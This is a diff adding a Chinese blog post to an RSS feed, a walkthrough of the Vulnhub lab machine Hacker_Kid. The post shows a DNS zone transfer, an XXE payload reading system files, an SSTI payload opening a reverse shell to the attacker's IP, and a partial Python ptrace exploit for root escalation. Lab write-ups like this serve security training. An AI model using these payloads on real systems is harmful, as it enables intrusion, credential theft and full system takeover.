@@ -10,14 +10,363 @@
         </author>
         <description>一个妄想全栈web小废物</description>
         <language>zh-CN</language>
-        <pubDate>Tue, 18 Jul 2023 00:00:00 +0800</pubDate>
-        <lastBuildDate>Tue, 18 Jul 2023 00:00:00 +0800</lastBuildDate>
+        <pubDate>Wed, 19 Jul 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Wed, 19 Jul 2023 00:00:00 +0800</lastBuildDate>
         <category term="Clown" />
         <category term="Web" />
         <category term="Pwn" />
         <category term="CTF" />
         <category term="AWD" />
         <category term="ACM" />
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</guid>
+            <title>Hacker_Kid-v1.0.1靶机打靶记录</title>
+            <link>https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</link>
+            <category term="Vulnhub" scheme="https://blog.xcu.icu/categories/Vulnhub/" />
+            <category term="Vulnhub" scheme="https://blog.xcu.icu/tags/Vulnhub/" />
+            <pubDate>Wed, 19 Jul 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;一个有意思的故事，一个简单的 web 漏洞，一个很有意思的提权方式&lt;/p&gt;
+&lt;h2 id=&#34;靶机描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#靶机描述&#34;&gt;#&lt;/a&gt; 靶机描述&lt;/h2&gt;
+&lt;p&gt;难度：OSCP 风格的中级难度&lt;/p&gt;
+&lt;p&gt;目标：拿到 root 权限&lt;/p&gt;
+&lt;p&gt;hint：关注信息收集，不需要蛮力破解，在每一步都有适当的提示&lt;/p&gt;
+&lt;p&gt;涉及的 攻击方法:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;主机发现&lt;/li&gt;
+&lt;li&gt;端口扫描&lt;/li&gt;
+&lt;li&gt;WEB 信息收集&lt;/li&gt;
+&lt;li&gt;DNS 区域传输&lt;/li&gt;
+&lt;li&gt;XXE 注入攻击&lt;/li&gt;
+&lt;li&gt;PHP 封装器&lt;/li&gt;
+&lt;li&gt;SSTI 模板注入&lt;/li&gt;
+&lt;li&gt;Capabilitie 提权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;虚拟机：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;格式： 虚拟机 （Virtualbox OVA）&lt;/li&gt;
+&lt;li&gt;操作系统： Linux.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;联网：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP 服务：已启用&lt;/li&gt;
+&lt;li&gt;IP 地址自动分配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;发布日期：2021 年 8 月 2 日&lt;/p&gt;
+&lt;h2 id=&#34;攻击流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击流程&#34;&gt;#&lt;/a&gt; 攻击流程&lt;/h2&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
+&lt;p&gt;打靶的第一步当然还是信息收集&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719094040573.png&#34; alt=&#34;image-20230719094040573&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里扫描得到目标靶机的 ip 是 192.168.13.196，接下来进行一个端口的探测&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719094210325.png&#34; alt=&#34;image-20230719094210325&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着对端口协议进行发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719094613896.png&#34; alt=&#34;image-20230719094613896&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到 53 端口是一个 domain 的域名服务，服务版本是 BAND9.16.1，80 是一个 apache 的 httpd 服务，9999 是一个 Tornado 的 httpd 服务&lt;/p&gt;
+&lt;p&gt;这里可以看到目标靶机的 53 端口开放着 tcp 服务，这常用与同一个域名下的两台 dns 服务器之间的通信，而我们日常中使用的 udp 协议，这里因为 nmap 默认扫描的是 tcp 协议，这里更改参数去扫描 udp 协议&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;sudo nmap -p53 -sU 192.168.13.196
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719102605164.png&#34; alt=&#34;image-20230719102605164&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里也是支持 udp 协议的，很明显这是一台 dns 服务器，但是现在不知道这台服务器包含哪些区域&lt;/p&gt;
+&lt;p&gt;接下来还是先去访问看一下&lt;/p&gt;
+&lt;p&gt;靶机的 80 端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719101021047.png&#34; alt=&#34;image-20230719101021047&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里是为了可读性，我将其翻译成为中文的形式，下面贴一下原文&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719104312944.png&#34; alt=&#34;image-20230719104312944&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里最下面一句话，反复强调要 dig me，这里很显然与 dig 这个工具有关，这里看一下源码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719110145446.png&#34; alt=&#34;image-20230719110145446&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里点击各个链接去查看还有没有有用的信息，但是发现上面的链接都不能正常访问，这里扫描一下目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719105746080.png&#34; alt=&#34;image-20230719105746080&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里只有这个 index.php 可以正常访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719105902947.png&#34; alt=&#34;image-20230719105902947&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里页面没有发生改变但是源码多了很多内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719110228258.png&#34; alt=&#34;image-20230719110228258&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里简单的查看一下，发现有两段注释&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!--  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&amp;lt;div class=&#34;text-mono&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &amp;lt;a href=&#34;#!&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;               title=&#34;Download Theme&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;               class=&#34;btn btn-success btn-shadow px-3 my-2 ml-0 text-left&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;              A Button&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &amp;lt;/a&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &amp;lt;a href=&#34;#!&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;               class=&#34;btn btn-danger btn-shadow px-3 my-2 ml-0 ml-sm-1 text-left&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;              Another Button&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &amp;lt;/a&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;          &amp;lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!--&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;div class=&#34;container py-5&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &amp;lt;h1&gt;Thanks&amp;lt;/h1&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; TO DO: Use a GET parameter page_no  to view pages.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- Optional JavaScript --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里可以看到这样一段话 Use a GET parameter page_no  to view pages. 这里提示使用 page_no 参数来查看页面，这里使用 burp 来批量看看页面有什么变化&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719111022699.png&#34; alt=&#34;image-20230719111022699&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里看到当参数等于 21 的时候返回的包长度是不同的，这里去访问看一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719111139180.png&#34; alt=&#34;image-20230719111139180&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里看到有一个域名 hackers.blackhat.local，这里编辑一下我本地的 host 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719112206993.png&#34; alt=&#34;image-20230719112206993&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着去访问这个域名&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719112351062.png&#34; alt=&#34;image-20230719112351062&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;但是也没有新的发现，这里用 dig 去做一个 axfr&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;dig axfr @192.168.13.196 blackhat.local
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719112623103.png&#34; alt=&#34;image-20230719112623103&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就拿到了目标的所有记录，这里看到这里有一个 hackerkid.blackhat.local，这里加入到 hosts 文件中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113049642.png&#34; alt=&#34;image-20230719113049642&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着去访问这个域名&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113027246.png&#34; alt=&#34;image-20230719113027246&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;总算是拿到了一点新的东西，继续加新的域名&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113539955.png&#34; alt=&#34;image-20230719113539955&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;别的页面都没有什么新的信息，这里继续去收集 9999 端口的页面&lt;/p&gt;
+&lt;p&gt;靶机的 9999 端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719103227710.png&#34; alt=&#34;image-20230719103227710&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里是一个登录页面，使用域名去访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113919910.png&#34; alt=&#34;image-20230719113919910&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里都去尝试了一下，只有这个页面，在将目光放回刚刚新发现的注册页面&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719114231479.png&#34; alt=&#34;image-20230719114231479&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用xxe注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用xxe注入&#34;&gt;#&lt;/a&gt; 漏洞利用 XXE 注入&lt;/h3&gt;
+&lt;p&gt;看到这个格式我第一反应就是这里有没有可能有 xxe 注入，这里引用一个外部资源&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&amp;gt;]&amp;gt;&amp;lt;root&amp;gt;&amp;lt;name&amp;gt;1&amp;lt;/name&amp;gt;&amp;lt;tel&amp;gt;1&amp;lt;/tel&amp;gt;&amp;lt;email&amp;gt;&amp;amp;xxe;&amp;lt;/email&amp;gt;&amp;lt;password&amp;gt;1&amp;lt;/password&amp;gt;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719121256334.png&#34; alt=&#34;image-20230719121256334&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到注入成功了，先看一下能执行 shell 的用户都有哪些&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719121747783.png&#34; alt=&#34;image-20230719121747783&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;除去 root 外还有一个 saket 账号可以执行 shell，下一个点在 home 目录下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;php://filter/convert.base64-encode/resource=/home/saket/.bashrc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719122247052.png&#34; alt=&#34;image-20230719122247052&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;拿到了这样一段信息，这里 base 解码后&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don&#39;t do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don&#39;t put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don&#39;t overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern &amp;quot;**&amp;quot; used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x /usr/bin/lesspipe ] &amp;amp;&amp;amp; eval &amp;quot;$(SHELL=/bin/sh lesspipe)&amp;quot;
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z &amp;quot;$&amp;#123;debian_chroot:-&amp;#125;&amp;quot; ] &amp;amp;&amp;amp; [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we &amp;quot;want&amp;quot; color)
+case &amp;quot;$TERM&amp;quot; in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n &amp;quot;$force_color_prompt&amp;quot; ]; then
+    if [ -x /usr/bin/tput ] &amp;amp;&amp;amp; tput setaf 1 &amp;gt;&amp;amp;/dev/null; then
+	# We have color support; assume it&#39;s compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ &amp;quot;$color_prompt&amp;quot; = yes ]; then
+    PS1=&#39;$&amp;#123;debian_chroot:+($debian_chroot)&amp;#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;
+else
+    PS1=&#39;$&amp;#123;debian_chroot:+($debian_chroot)&amp;#125;\u@\h:\w\$ &#39;
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case &amp;quot;$TERM&amp;quot; in
+xterm*|rxvt*)
+    PS1=&amp;quot;\[\e]0;$&amp;#123;debian_chroot:+($debian_chroot)&amp;#125;\u@\h: \w\a\]$PS1&amp;quot;
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors &amp;amp;&amp;amp; eval &amp;quot;$(dircolors -b ~/.dircolors)&amp;quot; || eval &amp;quot;$(dircolors -b)&amp;quot;
+    alias ls=&#39;ls --color=auto&#39;
+    #alias dir=&#39;dir --color=auto&#39;
+    #alias vdir=&#39;vdir --color=auto&#39;
+
+    alias grep=&#39;grep --color=auto&#39;
+    alias fgrep=&#39;fgrep --color=auto&#39;
+    alias egrep=&#39;egrep --color=auto&#39;
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39;
+
+# some more ls aliases
+alias ll=&#39;ls -alF&#39;
+alias la=&#39;ls -A&#39;
+alias l=&#39;ls -CF&#39;
+
+# Add an &amp;quot;alert&amp;quot; alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert=&#39;notify-send --urgency=low -i &amp;quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&amp;quot; &amp;quot;$(history|tail -n1|sed -e &#39;\&#39;&#39;s/^\s*[0-9]\+\s*//;s/[;&amp;amp;|]\s*alert$//&#39;\&#39;&#39;)&amp;quot;&#39;
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don&#39;t need to enable
+# this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+
+#Setting Password for running python app
+username=&amp;quot;admin&amp;quot;
+password=&amp;quot;Saket!#$%@!!&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有一个账号密码，这里应该是一个后台密码，尝试登录，但是报错了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719122533997.png&#34; alt=&#34;image-20230719122533997&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现密码是 saket・・・・，这里猜测这个密码不是 admin 的密码，而是 saket 的密码，这里尝试登录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719122834770.png&#34; alt=&#34;image-20230719122834770&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就成功登录进来了，这里看到提示信息，这里很显然是要传入一个 name&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719123151385.png&#34; alt=&#34;image-20230719123151385&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里直接回显出来了，这里能想到的就两种漏洞，xss 和 SSTI，简单的尝试一下&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用模版注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用模版注入&#34;&gt;#&lt;/a&gt; 漏洞利用模版注入&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;&amp;#123;&amp;#123;1+4&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719125152589.png&#34; alt=&#34;image-20230719125152589&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到使用的是一个 Traceback 的开发框架，这里运行在 python3.8，这里很显然一点存在模版注入，进一步测试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719125430282.png&#34; alt=&#34;image-20230719125430282&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.13.249/4444 0&gt;&amp;1&#34;&#39;)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719130338824.png&#34; alt=&#34;image-20230719130338824&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就成功拿到一个 shell，只不过是一个 saket 的 shell，接下来就是提权&lt;/p&gt;
+&lt;h3 id=&#34;提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h3&gt;
+&lt;p&gt;这个提权的方式也是比较特殊，通过 Capabilities 这个权限管理的功能来提权&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuNy9jYXBhYmlsaXRpZXMuNy5odG1s&#34;&gt; capabilities (7) - Linux manual page (man7.org)&lt;/span&gt;，这里贴一个 Capabilities 的权限介绍&lt;/p&gt;
+&lt;p&gt;使用 getcap / 查询整个系统上的 Capabilities 权限&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;/sbin/getcap -r / 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719132204493.png&#34; alt=&#34;image-20230719132204493&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;python2.7 有一个 cap_sys_ptrace 的权限，这个权限允许跟踪任何进程，接下来的思路就是找到已经是 root 权限运行的进程然后通过这个权限来提权，接下来查看运行的进程，这里下载一下这个漏洞利用的脚本，这里直接贴过去也行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import ctypes
+import sys
+import struct
+
+
+PTRACE_POKETEXT   = 4
+PTRACE_GETREGS    = 12
+PTRACE_SETREGS    = 13
+PTRACE_ATTACH     = 16
+PTRACE_DETACH     = 17
+
+
+class user_regs_struct(ctypes.Structure):
+    _fields_ = [
+        (&amp;quot;r15&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r14&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r13&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r12&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rbp&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rbx&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r11&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r10&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r9&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;r8&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rax&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rcx&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rdx&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rsi&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rdi&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;orig_rax&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rip&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;cs&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;eflags&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;rsp&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;ss&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;fs_base&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;gs_base&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;ds&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;es&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;fs&amp;quot;, ctypes.c_ulonglong),
+        (&amp;quot;gs&amp;quot;, ctypes.c_ulonglong),
+    ]
+
+libc = ctypes.CDLL(&amp;quot;libc.so.6&amp;quot;)
+
+pid=int(sys.argv[1])
+
+# Define argument type and respone type.
+libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
+libc.ptrace.restype = ctypes.c_uint64
+
+# Attach to the process
+libc.ptrace(PTRACE_ATTACH, pid, None, None)
+registers=user_regs_struct()
+
+# Retrieve the value stored in registers
+libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
+
